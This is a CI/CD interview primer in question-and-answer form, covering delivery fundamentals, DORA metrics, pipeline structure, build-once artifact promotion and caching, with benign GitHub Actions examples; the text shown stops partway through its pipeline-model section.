---
type: interview-prep
---

# CI/CD Interview Primer — 333 Questions

Comprehensive Q+A primer for senior CI/CD / platform-engineering / DevOps interviews. Sixth entry in the DevOps track — sister note to the Linux, Kubernetes, Observability, Terraform, and Docker primers. The discipline that ties the whole track together: how code gets built, tested, packaged, and safely delivered to production — pipelines, CI practices, GitHub Actions & GitLab CI, artifacts, deployment strategies, environments & promotion, GitOps, security, and the path to prod.

Each answer is interview-shaped: opinionated, concrete, real pipeline YAML (GitHub Actions & GitLab CI), deployment mechanics, failure modes, and production tradeoffs. Concept-first and tool-aware (GitHub Actions, GitLab, Jenkins, ArgoCD/Flux, Argo Rollouts); current (OIDC to cloud, reusable workflows, SLSA).

1. [[#CI/CD Fundamentals]]
2. [[#The Pipeline Model]]
3. [[#Continuous Integration Practices]]
4. [[#GitHub Actions Fundamentals]]
5. [[#GitHub Actions in Depth]]
6. [[#GitLab CI/CD]]
7. [[#Other CI Systems]]
8. [[#Build & Test Stages]]
9. [[#Artifacts & Artifact Management]]
10. [[#Container Image Pipelines]]
11. [[#Deployment Strategies]]
12. [[#Progressive Delivery & Canary Analysis]]
13. [[#Environments & Promotion]]
14. [[#GitOps & Pull-based CD]]
15. [[#Release Management & Versioning]]
16. [[#How Code Reaches Production]]
17. [[#Secrets & Security in CI/CD]]
18. [[#Pipeline Security & Supply Chain]]
19. [[#Testing & Verification in the Pipeline]]
20. [[#Deploy Observability, Rollback & DORA]]
21. [[#Scenario & Best-Practice Playbooks]]

---

## CI/CD Fundamentals

### Summary

**What this topic covers**

The conceptual bedrock every CI/CD interview stands on — what the letters actually mean, why the practice exists, and how a team knows it's working. Three concern areas live here: (1) the **definitions** — Continuous Integration (developers merge to a shared mainline frequently, each merge triggers an automated build + test) and the two very different things "CD" can expand to; (2) the **motivation** — fast feedback, small safe changes, repeatable releases, shorter lead time, and the business case that velocity and stability are not a tradeoff; and (3) the **measurement and culture** — the DORA metrics, the CALMS/DevOps framing, and how CI/CD relates to DevOps and SRE. The 16 questions in this topic are the warm-ups; every later topic (the pipeline model, deployment strategies, security) assumes you can already say precisely what CI, Continuous Delivery, and Continuous Deployment are without slurring them together.

**Mental model**

Think of CI/CD as a machine for **shrinking the distance between a commit and a confident release**. CI attacks the *integration* problem: if ten developers work in isolation for two weeks and merge on Friday, they get merge hell and a pile of hidden integration bugs. So CI says: integrate constantly — merge to main at least daily, and prove each merge is sound with an automated build and test that runs in minutes. CD extends the same logic past the merge: once every green build is *provably releasable*, releasing stops being a scary event and becomes a routine. The core intuition is **"if it hurts, do it more often."** Painful, rare, big-bang releases get less risky when you make them small, frequent, and automated — batch size is the master variable. A good deploy is *boring*: no war room, no held breath, and a one-click rollback if the metrics wobble. If your releases still feel like surgery, you don't have CI/CD yet — you have a build server.

**Key terms**

- **Continuous Integration (CI)** — developers merge to a shared mainline frequently; every merge triggers an automated build + test to catch integration problems immediately.
- **Continuous Delivery** — every green build is *releasable* and sits ready; a human approves the actual production deploy.
- **Continuous Deployment** — every green build *auto-ships* to production with no manual gate; the pipeline is the release decision.
- **Deployment pipeline** — the automated path from commit to production, running build → test → package → deploy through environments.
- **Lead time for changes** — elapsed time from code committed to code running in production; a DORA metric.
- **Deployment frequency** — how often you ship to prod; a DORA metric and proxy for batch size.
- **Change failure rate** — fraction of deploys that cause a degraded service needing remediation; a DORA metric.
- **MTTR / time to restore** — how fast you recover from a failed change or incident; a DORA metric.
- **Batch size** — how much change ships per release; the lever that trades off risk vs velocity.
- **CALMS** — Culture, Automation, Lean, Measurement, Sharing — a framework for DevOps maturity.
- **Trunk / mainline** — the shared branch (usually `main`) that must always stay green and releasable.
- **Boring deploy** — a release so automated and reversible it produces no anxiety.

**Why interviewers ask this**

These questions separate people who *use* a CI tool from people who understand the *practice*. A junior says "CI/CD is the Jenkins/GitHub Actions pipeline." A senior says "CI is a team habit of integrating small and often; the tool just enforces it — you can have a pipeline and still not be doing CI if everyone branches for a week." The Continuous Delivery vs Continuous Deployment distinction is the single most reliable tell: getting it precisely right (delivery keeps a human gate, deployment removes it) signals you've thought about release governance, not just YAML. Interviewers also want to hear the *business* framing — that CI/CD is how you get velocity and stability together, evidenced by DORA — because platform and DevOps roles are ultimately judged on those outcomes, not on how clever the pipeline is.

**Common confusions**

- "CD always means Continuous Deployment" — no; CD usually means Continuous *Delivery* (releasable, human-gated). Continuous Deployment (no gate) is a stricter superset most orgs don't fully adopt.
- "CI/CD is a tool you install" — it's a *practice*; the tool enforces it. Buying GitHub Actions doesn't mean you're doing CI.
- "More automation means less stability" — the opposite; DORA data shows elite performers deploy far more often *and* have lower change failure rates.
- "Continuous Integration means a server builds my branch" — it means the *team* integrates to a shared mainline frequently. A per-branch build with no frequent merging isn't CI.
- "CI/CD and DevOps are the same" — CI/CD is a core practice *within* DevOps; DevOps is the broader culture, and SRE is one opinionated implementation of it.

**What follows from this topic**

Everything downstream. The deployment-pipeline concept expands into **The Pipeline Model** (stages, jobs, artifacts, build-once). The "integrate small and often" habit is detailed in **Continuous Integration Practices** (trunk-based development, keeping main green, merge queues). The delivery-vs-deployment gate reappears wherever this primer discusses environments, approvals, and deployment strategies. Fix your vocabulary here first — the rest of CI/CD is applied consequences of these definitions.

### Q1. What is Continuous Integration, in one sentence, and what problem does it solve?

Continuous Integration is the practice of **developers merging their work to a shared mainline frequently — at least daily — with every merge triggering an automated build and test** so integration problems surface within minutes instead of at the end of a release cycle.

The problem it solves is **integration risk**. When developers work in isolation for days or weeks, their changes drift apart, and merging them all at once ("integration phase") produces conflicts, broken assumptions, and bugs that are expensive to untangle because nobody remembers the context. CI removes the big-bang integration by making integration continuous and small: each change is proven against the current mainline immediately, so a break is caught while it's one commit old and one author deep.

The give-away that a team *isn't* doing CI: long-lived feature branches, a dreaded "merge week," and a red build that stays red. The tool (GitHub Actions, GitLab CI, Jenkins) is just the enforcement mechanism — CI is the *habit* of integrating often.

### Q2. Continuous Delivery vs Continuous Deployment — what's the difference and why does it matter?

This is the distinction interviewers most want you to nail. Both mean every green build is production-quality; they differ on the **final gate to prod**.

| | Continuous Delivery | Continuous Deployment |
|---|---|---|
| Every green build is… | releasable, sitting ready | shipped to prod automatically |
| Production gate | a **human** clicks deploy/approve | **none** — the pipeline decides |
| Release cadence | on demand, whenever the business wants | every merge that passes |
| Best when | regulated, coordinated launches, marketing timing | high-trust teams, strong test + monitoring + rollback |
| Risk control | human judgement + automation | automation only, so tests/observability must be excellent |

**Continuous Delivery** — the pipeline guarantees you *could* ship at any moment; a person decides *when*. This suits regulated industries, coordinated releases, or anything needing a business sign-off.

**Continuous Deployment** — remove the human gate: every commit that passes the pipeline auto-ships to prod. It demands mature testing, feature flags, canary/automated rollback, and real observability, because there's no human backstop.

Why it matters: it reveals whether you understand **release governance**. Saying "we do CD" is ambiguous; a senior clarifies which one and what controls (flags, canaries, approvals) sit at the boundary.

### Q3. Why does CI/CD exist? Make the case to a skeptical engineering manager.

Five arguments, from fastest payoff to strategic:

1. **Fast feedback.** A bug found 3 minutes after a commit costs minutes to fix; the same bug found in a two-week integration phase costs hours and a context reload. CI compresses the feedback loop.
2. **Smaller, safer changes.** Automated pipelines make it cheap to ship small diffs. Small diffs are easier to review, easier to reason about, and easier to roll back — change failure rate drops.
3. **Repeatable, auditable releases.** A scripted pipeline does the same thing every time. No "works on the release engineer's laptop," no forgotten step, and a full audit trail of what shipped and when.
4. **Shorter lead time.** Code reaches users faster, so the business learns faster and competitors have less room.
5. **Less release anxiety.** Rare manual releases build fear, which builds bigger batches, which builds more fear. CI/CD breaks the spiral: boring, frequent deploys.

The clincher for a manager is the DORA evidence: teams with strong CI/CD deploy more often *and* fail less often. Velocity and stability aren't a tradeoff — that's the whole pitch.

### Q4. What is a deployment pipeline?

A **deployment pipeline** is the automated path a change travels from **commit to production** — the concrete implementation of Continuous Delivery/Deployment.

The canonical shape: **commit → build → unit test → package an immutable artifact → integration test → deploy to staging → end-to-end test → deploy to production.** Each stage is a quality gate; a change only advances if the previous stage passed. Crucially, you **build the artifact once** and *promote the same artifact* through each environment — you never rebuild per environment, because rebuilding reintroduces the risk that what you tested isn't what you ship.

The term comes from *Continuous Delivery* (Humble & Farley). The key mental shift it encodes: a release isn't an event you perform, it's the **end of a pipeline the change was always travelling through**. Everything else in CI/CD — stages, gates, artifacts, environments — is vocabulary for parts of this pipeline.

### Q5. "Velocity and stability are a tradeoff — go faster and you'll break more." Respond.

This is the intuition CI/CD exists to overturn, and the DORA research is the counter-evidence. The **State of DevOps** studies consistently find that elite-performing teams deploy *more frequently and* have a *lower change failure rate* and faster recovery — the two move together, not against each other.

The mechanism: going faster *the CI/CD way* means shipping **smaller batches**. A small change is easier to review, has a smaller blast radius, is faster to test, and is trivial to roll back. So high deployment frequency correlates with *lower* risk per deploy, not higher. The teams that "break more when they go faster" are the ones going faster by cutting corners — skipping tests, batching bigger — which is exactly what CI/CD forbids.

The honest nuance: it's not automatic. Velocity-with-stability requires the investment — automated tests, good pipelines, observability, rollback. Without those, speed *does* break things. CI/CD is the discipline that buys you both.

### Q6. What are the DORA metrics and how do you use them?

The four **DORA** metrics, from Google's DevOps Research and Assessment, measure software delivery performance. Two are about throughput, two about stability:

| Metric | Measures | Elite (rough) |
|---|---|---|
| **Deployment frequency** | how often you ship to prod | on-demand, multiple/day |
| **Lead time for changes** | commit → running in prod | < 1 hour |
| **Change failure rate** | % of deploys causing a degraded service | 0–15% |
| **Time to restore (MTTR)** | recovery time after a failed change | < 1 hour |

Performers are bucketed **Elite / High / Medium / Low**. The insight is that throughput (first two) and stability (last two) are *not* in tension — elite teams score well on all four.

How to use them: as a **trend and a diagnostic**, not a leaderboard. Low deployment frequency + long lead time points at a slow or manual pipeline; high change failure rate points at weak testing or too-big batches; long MTTR points at missing rollback/observability. Don't game them (deploy trivial commits to boost frequency) — pair them with a fifth signal like reliability/SLOs so you're measuring outcomes, not activity.

### Q7. What is CALMS and why does culture matter for CI/CD?

**CALMS** is a maturity framework for DevOps, and CI/CD is where its principles become concrete:

- **Culture** — shared ownership of delivery; devs and ops aren't throwing work over a wall. "You build it, you run it."
- **Automation** — build, test, deploy, provision — remove humans from repeatable toil.
- **Lean** — small batches, limit work-in-progress, optimise flow (this is the CI/CD batch-size argument).
- **Measurement** — instrument everything; DORA metrics, SLOs, pipeline analytics.
- **Sharing** — visibility and blameless learning across teams.

Culture matters because CI/CD **fails on org problems, not tool problems.** You can install the best pipeline and still not be doing CI if the team culturally prefers long-lived branches, ignores a red build, or treats deploys as ops' job. A red mainline that stays red for a day is a *cultural* failure (nobody stopped the line), not a Jenkins failure. Interviewers raise CALMS to check you understand CI/CD as a socio-technical practice, not a YAML file.

### Q8. What's the difference between CI/CD, DevOps, and SRE?

They nest, roughly from specific to broad to opinionated:

- **CI/CD** — a *practice*: integrate frequently, and automate the path from commit to production. It's a concrete set of habits and pipelines.
- **DevOps** — a *culture/movement*: break down the dev-vs-ops wall so one team owns building *and* running software. CI/CD is DevOps' most important technical practice, but DevOps also covers ownership, on-call, infra-as-code, and collaboration.
- **SRE (Site Reliability Engineering)** — Google's *opinionated implementation* of DevOps: reliability treated as engineering, with error budgets, SLOs, toil reduction, and blameless postmortems. "SRE is what happens when you ask a software engineer to design an operations team."

A clean way to say it in interview: *DevOps is the philosophy, SRE is one prescriptive way to do DevOps, and CI/CD is the core delivery practice both rely on.* Confusing them (e.g. "DevOps is a job title that runs the pipeline") is a junior tell.

### Q9. What does "if it hurts, do it more often" mean in a CI/CD context?

It's the central heuristic behind continuous integration and delivery. Painful activities — merging, releasing, database migrations, cutting a build — hurt precisely *because* they're rare and big. So the counter-intuitive fix is to do them **more frequently, in smaller pieces**, until the pain is automated and amortised away.

- Merging hurts? Merge to main daily instead of every two weeks — conflicts shrink from a mountain to a molehill.
- Releasing hurts? Release small changes continuously instead of a quarterly big-bang — each release is boring and reversible.
- Migrations hurt? Run small, backward-compatible migrations often instead of one giant schema change.

The mechanism is **feedback + batch size**. Frequent, small actions give fast feedback and small blast radius; rare, large actions accumulate risk and hide bugs. The practice forces you to invest in automation for the thing that hurts, which then makes it not hurt. It's the philosophical root of CI ("integrate constantly") and CD ("release constantly").

### Q10. Why is batch size the key variable in delivery risk?

Because almost every delivery risk scales with **how much change ships at once.**

A large batch (say two weeks of ten developers' work) is: harder to review thoroughly, more likely to hide a bug in the noise, harder to reason about when it breaks (which of 500 changes caused it?), and terrifying to roll back (you lose everyone's work). A small batch (one reviewed diff) is the opposite on every axis — easy review, obvious cause on failure, trivial rollback, small blast radius.

So reducing batch size simultaneously improves **change failure rate** (fewer bugs slip through), **MTTR** (obvious culprit, easy revert), and **lead time** (nothing waits in a queue). This is why CI/CD is obsessed with frequency: deploying often *is* the mechanism for keeping batches small. "Deploy more frequently" isn't about speed for its own sake — it's the lever that pulls risk *down*. In interview, tie it back to DORA: high deployment frequency correlates with low change failure rate precisely because both are downstream of small batch size.

### Q11. What makes a deployment "boring," and why is boring the goal?

A **boring deploy** is one that produces no anxiety: no war room, no held breath, no "please don't break." It's boring because it's:

- **Small** — a little change, small blast radius.
- **Automated** — the same scripted pipeline every time; no manual runbook to fumble.
- **Frequent** — you've done it a hundred times this month; it's muscle memory.
- **Observable** — dashboards and alerts tell you immediately if something's wrong.
- **Reversible** — one-click rollback (or automated rollback on a bad canary), so a mistake is a shrug, not a crisis.

Boring is the goal because **excitement in a deploy is fear, and fear makes releases rare, and rare releases get big, and big releases are genuinely dangerous** — the spiral CI/CD breaks. When deploys are boring, teams ship often, batches stay small, and stability *improves*. The senior framing: "we've engineered the drama out of releasing." If your deploys are exciting, that's a problem to fix, not a badge of honour.

### Q12. What's the cost of NOT doing CI/CD?

Frame it as the concrete pains that CI/CD removes:

- **Big-bang releases** — huge, rare deployments where hundreds of changes ship together, any of which could break, with no way to isolate the culprit.
- **Merge hell** — long-lived branches drift so far from main that merging is a multi-day archaeology project.
- **Integration risk** — bugs from how changes interact stay hidden until the late integration phase, the most expensive time to find them.
- **Release anxiety** — deploys become dreaded events, so they get rarer, so batches grow, so they get scarier — a doom loop.
- **"Works on my machine"** — manual, unscripted releases mean environment drift and irreproducible builds.
- **Slow lead time** — features sit finished-but-unreleased for weeks, so the business learns slowly.
- **Long MTTR** — with big batches and no rollback plan, recovering from a bad release is slow and manual.

The summary line for interview: without CI/CD you pay in *risk, speed, and morale simultaneously* — and DORA shows those low-performing outcomes cluster together.

### Q13. Is Continuous Integration a practice or a tool? Why does the distinction matter?

**A practice** — and the distinction is the point of the question. CI is a team *habit*: integrate small changes to a shared mainline frequently, keep that mainline green, and fix a broken build immediately. The tool (GitHub Actions, GitLab CI, Jenkins) merely *enforces and automates* the habit.

Why it matters: you can own the best CI tool on earth and **still not be doing CI.** If your team runs pipelines but everyone works on week-long feature branches that merge rarely, you've automated builds but you haven't achieved continuous *integration* — the integration is still infrequent and risky. Conversely, a team with a crude script but a strong daily-merge, keep-main-green discipline is doing real CI.

The test in interview: if someone says "we have CI, we use Jenkins," a good follow-up is "how often does the average developer merge to main?" If the answer is "when the feature's done, maybe every week or two," they have a build server, not CI. The practice is the substance; the tool is plumbing.

### Q14. Walk me through how a single code change reaches production in a healthy CI/CD setup.

A concrete end-to-end narrative:

1. **Commit + push** — a developer makes a small change on a short-lived branch and pushes; the pipeline triggers automatically on the pull request.
2. **CI checks** — the pipeline checks out the code, builds it, runs unit tests, lint, and security scans in parallel. Required status checks must go green before merge.
3. **Review + merge** — a teammate reviews the small diff; with green checks it merges to `main` (often via a merge queue so main stays green).
4. **Build once** — on merge to main, the pipeline builds an **immutable, versioned artifact** (container image tagged by git-sha) and pushes it to an artifact registry.
5. **Promote through environments** — the *same* artifact deploys to staging, where integration and end-to-end tests run against a production-like environment.
6. **Production gate** — Continuous Delivery: a human approves. Continuous Deployment: it proceeds automatically.
7. **Progressive rollout** — deploy via canary or blue-green, watch metrics/SLOs, ramp up traffic. On a bad signal, automated rollback.
8. **Observe** — dashboards and alerts confirm health; the change is now live and boring.

The load-bearing details: small batch, build-once/promote-same-artifact, gates between stages, and a rollback path.

### Q15. A team ships once a quarter in a coordinated overnight release with a rollback runbook. What would you change and in what order?

Diagnose first: quarterly, coordinated, overnight, manual-runbook rollback — this is the big-bang anti-pattern. The batch is enormous, the deploy is high-drama, and recovery is slow. I'd change it incrementally (you can't flip to Continuous Deployment overnight):

1. **Shorten integration first.** Move the team toward trunk-based development and daily merges so batches stop growing. This attacks the root cause — batch size — before touching the release cadence.
2. **Automate the pipeline.** Get build + test + package running automatically on every merge, producing an immutable artifact. Keep main green.
3. **Make the release repeatable.** Replace the overnight runbook with a scripted, one-command deploy to staging then prod. Same artifact promoted, no manual steps.
4. **Add a fast rollback / progressive delivery.** Introduce blue-green or canary so rollback is instant and automatic, retiring the manual runbook.
5. **Increase frequency gradually.** Quarter → month → week → on-demand. Each step shrinks batch size and de-risks the next.
6. **Measure with DORA.** Track lead time and change failure rate to prove it's working and find the next bottleneck.

Order matters: shrink batches and automate *before* you speed up cadence, or you just make big-bang releases more frequent.

### Q16. How do you know your CI/CD is actually working? What would you look at?

Don't point at the tool ("we have pipelines"); point at **outcomes and behaviours.**

**The DORA metrics** are the headline evidence:
- **Deployment frequency** rising and **lead time** falling → the pipeline is genuinely delivering, not just building.
- **Change failure rate** flat or falling *while* frequency rises → you have velocity *and* stability, the CI/CD promise.
- **MTTR** short → your rollback and observability actually work.

**Behavioural signals** that back up the numbers:
- Main is green almost always; a red build gets fixed in minutes, not hours (stop-the-line culture).
- Developers merge to main daily; branches are short-lived.
- Deploys are boring — no war room, no held breath.
- Rollback is a routine one-click action, not a rare heroic event.

**Anti-signals** that it's *not* working: a chronically red build people ignore, flaky tests that get re-run until green, long-lived branches, releases that still need a war room, and a pipeline so slow (hours) that people batch changes to avoid it. If the metrics are good but the behaviours are bad, dig — you may be gaming the numbers. Real CI/CD shows up in both.

## The Pipeline Model

### Summary

**What this topic covers**

The anatomy of a delivery pipeline — the shared vocabulary and structural principles that carry across every tool (GitHub Actions, GitLab CI, Jenkins, CircleCI). Three concern areas: (1) the **structure** — stages, jobs, and steps; triggers/events; the canonical checkout → build → test → package → deploy flow; sequential stages vs a DAG of parallel jobs; (2) the **artifact discipline** — the build-once/promote-the-same-artifact principle, passing artifacts between jobs, immutability and reproducibility, caching; and (3) the **control and reuse** — gates and approvals, fan-out/fan-in, reusable templates, ephemeral build environments, and *pipeline as code*. The 16 questions here turn the abstract "deployment pipeline" from the fundamentals topic into concrete moving parts you can design, debug, and speed up. This is the topic where you show you can reason about a pipeline's shape — not just copy a YAML snippet.

**Mental model**

A pipeline is a **directed graph of work triggered by an event, carrying artifacts from a commit toward production, with gates in between.** Read it in three zooms. Zoomed out: **stages** are the coarse phases (build, test, deploy) that give the pipeline its shape and its quality gates. Zoomed in: each stage contains **jobs** that can run in parallel on separate runners; jobs express order with `needs`/`depends_on`, turning a rigid sequence into a **DAG** so independent work happens concurrently and the pipeline finishes faster. Zoomed all the way in: each job runs **steps/tasks** — the actual commands and actions. Two invariants govern the whole graph: **build the artifact once** and promote that identical artifact downstream (never rebuild per environment), and **the pipeline definition lives in the repo as code** — versioned, reviewed, and rolled back like any other source. A good pipeline is fast (parallel where it can be), reproducible (same input, same output), and self-describing (its YAML is the documentation).

**Key terms**

- **Stage** — a coarse phase of the pipeline (build, test, deploy) that acts as a quality gate.
- **Job** — a unit of work within a stage, run on its own runner; jobs can run in parallel.
- **Step / task** — an individual command or action inside a job (`run:` a script or `uses:` an action).
- **Trigger / event** — what starts a pipeline: push, pull request, tag, schedule (cron), manual dispatch, or an upstream pipeline.
- **DAG** — directed acyclic graph of jobs; `needs:`/`depends_on:` express dependencies so independents run concurrently.
- **Artifact** — a built output (binary, container image, bundle) passed between jobs or promoted between environments.
- **Build-once** — produce the deployable artifact a single time and reuse it downstream, never rebuilding per stage/env.
- **Fail-fast** — abort the pipeline (or a matrix) on the first failure instead of running everything.
- **Gate / approval** — a manual or automated checkpoint between stages (e.g. a required reviewer before prod).
- **Fan-out / fan-in** — split into many parallel jobs, then converge to a single downstream job.
- **Pipeline as code** — the pipeline defined in a versioned file in the repo, not click-configured in a UI.
- **Ephemeral runner** — a clean, throwaway environment per run for reproducibility.

**Why interviewers ask this**

This topic tests whether you can *reason about pipeline shape*, which is the daily work of a platform engineer. Juniors describe a pipeline as a linear list of steps and rebuild the app in every stage; seniors see a DAG, parallelise independent jobs, and insist on building the artifact once and promoting it. The build-once principle is a favourite probe — a candidate who rebuilds per environment doesn't understand reproducibility, because "what you tested" is no longer "what you ship." Pipeline-as-code is another signal: knowing *why* it matters (review, audit, rollback of the pipeline itself, no snowflake Jenkins jobs) shows you treat CI config as real software. Expect "design a pipeline for X," "why is this pipeline slow," and "what's wrong with this workflow" — all of which reward structural thinking over YAML memorisation.

**Common confusions**

- "A pipeline is a straight line of steps" — modern pipelines are DAGs; independent jobs run in parallel and only ordering dependencies are sequential.
- "Rebuild in each stage so each environment is fresh" — no; rebuilding breaks reproducibility. Build once, promote the same artifact.
- "Stages, jobs, and steps are interchangeable words" — they nest: stages contain jobs contain steps. Mixing them is a tell.
- "Caching and artifacts are the same" — a cache speeds up a run and is disposable; an artifact is a deliverable passed downstream or shipped.
- "Pipeline-as-code is just a config file preference" — it's what makes the pipeline reviewable, auditable, and revertable; UI-clicked jobs are unversioned snowflakes.
- "Fail-fast is always right" — sometimes you want to run the whole test matrix to see *all* failures; fail-fast trades completeness for speed.

**What follows from this topic**

The structural vocabulary here underpins the whole primer. The build-once/artifact discipline drives **deployment strategies** (you promote one immutable image through blue-green or canary) and **supply-chain security** (you sign and attest that one artifact). Triggers and gates connect to **Continuous Integration Practices** (PR-triggered checks, branch protection) and to environment approvals. Pipeline-as-code is the foundation for reusable templates and for the tool-specific deep-dives (GitHub Actions, GitLab CI). Master the pipeline's anatomy here and the rest of CI/CD is applying it.

### Q1. What are the stages, jobs, and steps of a pipeline? Explain the vocabulary.

They nest, coarse to fine, and the words are consistent enough across tools that mixing them up is a tell:

- **Stage** — a coarse *phase* of the pipeline: build, test, deploy. Stages usually run in sequence and act as **quality gates** — you don't advance to deploy until test passes. GitLab makes stages explicit (`stages:`); GitHub Actions models them implicitly via job dependencies.
- **Job** — a unit of work *within* a phase, run on its own runner/agent in a fresh environment. Jobs in the same stage typically run **in parallel**. "Run unit tests," "run lint," "build the image" are jobs.
- **Step / task** — an individual command *inside* a job. In GitHub Actions a step is either `run:` (a shell command) or `uses:` (a marketplace/composite action). In GitLab a job's `script:` is a list of shell steps.

```yaml
# GitHub Actions — job with steps
jobs:
  test:                      # a job
    runs-on: ubuntu-latest
    steps:                   # steps inside the job
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test
```

The mental model: **stages give the pipeline its shape and gates; jobs give it parallelism; steps do the actual work.**

### Q2. What events can trigger a pipeline?

Triggers (`on:` in GitHub Actions, `rules:`/`workflow:` in GitLab) decide when a pipeline runs:

- **Push** — commits pushed to a branch; the workhorse trigger for CI.
- **Pull request / merge request** — run checks on proposed changes before merge (often the *most important* trigger — it gates the merge).
- **Tag** — pushing a version tag (`v1.2.0`) triggers a release pipeline.
- **Schedule / cron** — time-based runs for nightly builds, dependency scans, or cleanup.
- **Manual dispatch** — a human clicks "run" (`workflow_dispatch`), often with inputs; used for deploys and one-off ops.
- **Upstream pipeline** — one pipeline finishing triggers another (`workflow_run`, GitLab pipeline triggers) — chaining build → deploy across repos.

```yaml
on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 2 * * *'      # nightly at 02:00 UTC
  workflow_dispatch:          # manual button
```

A senior distinguishes `pull_request` (safe, runs in the *fork's* context, no secrets) from `pull_request_target` (runs in the *base* repo's context *with* secrets — a poisoned-pipeline footgun for fork PRs).

### Q3. Walk me through the canonical flow of a full CI/CD pipeline.

The archetypal path from commit to production, each arrow a quality gate:

**checkout → build → unit test → package artifact → integration test → deploy to staging → end-to-end test → deploy to production**

1. **Checkout** — pull the source at the triggering commit into a clean runner.
2. **Build** — compile / bundle the application.
3. **Unit test** — fast, isolated tests; the first gate. Fail here and stop cheaply.
4. **Package artifact** — produce the **immutable, versioned** deployable (container image tagged by git-sha) *once*. Everything downstream reuses it.
5. **Integration test** — test components together against real dependencies.
6. **Deploy to staging** — push the artifact to a production-like environment.
7. **End-to-end test** — exercise the whole system as a user would.
8. **Deploy to production** — Continuous Delivery gates this on a human approval; Continuous Deployment proceeds automatically, usually via canary/blue-green with automated rollback.

The two invariants threaded through: **build the artifact once and promote it** (steps 4→6→8 use the same image), and **each stage is a gate** so a failure never reaches the next environment.

### Q4. What is "pipeline as code" and why does it matter?

**Pipeline as code** means the pipeline's definition lives in a **versioned file in the repository** (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) — not click-configured in a server's web UI, the way classic Jenkins "freestyle" jobs were.

Why it matters, beyond aesthetics:

- **Reviewable** — pipeline changes go through pull requests and code review like any other change. You can't silently weaken a security scan; someone reviews the diff.
- **Versioned** — the pipeline is tied to the commit it built. Checking out an old commit gives you the pipeline *as it was then*; history shows who changed what and when.
- **Auditable** — regulators and postmortems can see exactly what the pipeline did at any point in time.
- **Revertable** — a bad pipeline change is a `git revert`, not archaeology in a UI.
- **No snowflakes** — UI-configured jobs are unversioned, undocumented, and impossible to reproduce ("who changed the build server config in 2022?"). Pipeline-as-code makes the pipeline reproducible infrastructure.

The one-liner: pipeline-as-code treats your CI config as **real software** — reviewed, versioned, and rolled back — which is exactly what a system that gates production deserves.

### Q5. Sequential stages vs a DAG of jobs — what's the difference and why prefer a DAG?

A **sequential** pipeline runs stage after stage: everything in "test" waits for *all* of "build" to finish, even parts that don't depend on it. A **DAG (directed acyclic graph)** models the real dependencies between individual jobs, so anything without a dependency runs **in parallel**.

Example: lint, unit tests, and a security scan don't depend on each other — in a strict stage model they might still be serialised, but as a DAG they run concurrently, and the integration-test job declares it `needs` the build. The result is a **shorter critical path** and a faster pipeline.

```yaml
# GitHub Actions — jobs form a DAG via needs:
jobs:
  build:      { runs-on: ubuntu-latest, steps: [ ... ] }
  lint:       { runs-on: ubuntu-latest, steps: [ ... ] }   # parallel with build
  unit-test:  { needs: build, runs-on: ubuntu-latest, steps: [ ... ] }
  e2e:        { needs: [build, unit-test], runs-on: ubuntu-latest, steps: [ ... ] }
```

GitLab does the same with `needs:` (turning ordered `stages` into a DAG). Prefer a DAG because **only genuine dependencies should cost you time** — everything else should run in parallel. The main cost is complexity; a huge tangled DAG is harder to read than a few clean stages.

### Q6. Fail-fast vs run-all — when do you want each?

**Fail-fast** aborts the pipeline (or a matrix) at the first failure. **Run-all** lets remaining jobs finish so you see *every* failure in one run.

- **Fail-fast** saves time and runner cost — no point running a 20-minute e2e suite if unit tests already failed. It's the sensible default for the *sequence* of stages: don't deploy to staging if the build broke.
- **Run-all** is what you want inside a **test matrix** when you need the full failure picture. If you're testing across Node 18/20/22 and three OSes, fail-fast hides whether the bug is one cell or all nine; disabling it (`fail-fast: false`) shows every failing combination at once, so you diagnose in one pass instead of nine.

```yaml
strategy:
  fail-fast: false          # run every matrix cell even if one fails
  matrix:
    node: [18, 20, 22]
    os: [ubuntu-latest, macos-latest, windows-latest]
```

The rule of thumb: **fail-fast for the linear gate path** (stop wasting time on a doomed run), **run-all for matrices and exploratory test sweeps** (you want complete information).

### Q7. Explain the build-once principle. Why never rebuild per environment?

**Build once, promote the same artifact.** You produce the deployable artifact — a container image, a jar, a bundle — a *single time* early in the pipeline, then promote that *exact* artifact through staging, pre-prod, and production. You never rebuild it per environment.

Why it's non-negotiable:

- **Reproducibility / test validity** — if you rebuild for prod, that prod build is *not* the thing you tested in staging. A dependency could have shifted, a base image updated, a transient network fetch differed. The whole point of testing in staging is undermined if prod runs a different binary.
- **Immutability + traceability** — one artifact, one digest, tagged by git-sha. You can point at exactly what's in prod and trace it to a commit.
- **Speed and cost** — building once instead of four times is faster and cheaper.

The correct pattern is **configuration is injected at deploy time** (env vars, config maps, secrets), not baked into per-environment builds. Same image everywhere; only the config differs.

The failure mode to name: "we build a separate image for prod" — that's a reproducibility hole. What you validated isn't what you shipped, so your gates lied to you.

### Q8. How do artifacts move between jobs and stages? How is that different from caching?

Because each job runs on a **fresh, isolated runner**, a job that builds something must explicitly *publish* it for a later job to *consume* it. That's **artifacts**.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with: { name: dist, path: dist/ }
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: { name: dist }
      - run: ./deploy.sh dist/
```

GitLab uses `artifacts:` (published, browsable, passed to dependent jobs) and `dependencies:`/`needs:` to consume them.

**Artifacts vs cache** — a frequent confusion:

| | Artifact | Cache |
|---|---|---|
| Purpose | a *deliverable* passed downstream or shipped | *speed up* a run |
| Correctness | required — the pipeline needs it | optional — a miss just rebuilds |
| Lifetime | retained, versioned, sometimes the release itself | ephemeral, best-effort |
| Example | the built container image, test reports | `node_modules`, compiler cache |

Key rule: **never depend on a cache for correctness** (it can be evicted or corrupt); use artifacts for anything a later stage *needs*. Cache is an optimisation; artifacts are the pipeline's data flow.

### Q9. How does caching speed up a pipeline, and what's the risk?

Caching persists expensive-to-produce, rarely-changing data *between runs* so you don't recompute it every time — most commonly dependency directories (`node_modules`, `~/.m2`, `~/.cargo`) and build/compiler caches.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}
    restore-keys: npm-
```

The **key** is the whole game: it should be a hash of the lockfile so the cache invalidates automatically when dependencies change, with a looser `restore-keys` prefix as a fallback for partial hits.

